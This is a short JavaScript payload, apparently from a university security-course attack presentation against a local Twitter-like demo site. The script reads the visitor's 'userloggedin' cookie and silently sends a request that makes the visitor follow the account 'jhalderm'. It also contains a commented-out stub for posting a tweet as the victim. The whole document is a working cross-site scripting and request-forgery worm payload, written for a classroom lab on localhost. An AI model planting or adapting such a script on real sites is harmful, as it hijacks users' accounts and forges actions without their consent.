<script type="text/javascript">
        function getCookie(cname) {
            var name = cname + "=";
            var ca = document.cookie.split(';');
            for(var i=0; i<ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0)==' ') c = c.substring(1);
                if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
            }
            return "";
        }
        var ca = getCookie("userloggedin");
        if (ca != "jhalderm") {
            var followRequest = new XMLHttpRequest();
            followRequest.open("GET", "http://localhost/EECS588-Attack-Presentation/follow.php?follower=" + ca + "&followee=jhalderm", true);
            followRequest.send();
            /*var tweetRequest = new XMLHttpRequest();
            tweetRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            tweetRequest.send("userId="+ca, code);*/
        }
</script>
